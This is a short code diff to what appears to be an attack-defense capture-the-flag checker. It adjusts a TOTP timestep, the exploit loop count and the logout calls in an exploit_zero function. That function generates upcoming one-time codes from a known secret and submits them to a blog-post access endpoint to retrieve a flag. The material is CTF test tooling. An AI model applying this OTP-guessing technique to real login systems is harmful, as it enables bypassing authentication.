@@ -41,8 +41,7 @@ class Totp_Client:
 
         self.secret_key = ""
         self.init_time = init_time
-        #ADJUST TIMESTEP
-        self.timestep = 15
+        self.timestep = 30
         self.timestep_counter = 0
         if num_digits > 10 or num_digits < 6:
             raise ValueError("The number of digits for the OTP must be between 6 and 10")
@@ -256,7 +255,7 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
     totp_device.calculate_current_timestep_count()
 
     #60 divided by range -> length of validity period
-    for i in range(4):
+    for i in range(3):
         usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
         logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
         r = await client.post("auth/accessblogpost/"+ str(post_id), data={"code":usercode}, cookies=cookie)
@@ -266,9 +265,9 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
         if body is not None:
             logger.debug(f"paragraph: {body.string}")
             if flag := searcher.search_flag(r.text):
-                await logout_user(client, logger, username)
+                #await logout_user(client, logger, username)
                 return flag
-    await logout_user(client, logger, username)
+    #await logout_user(client, logger, username)
     raise MumbleException("Flag not found in exploit")
 
     #assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
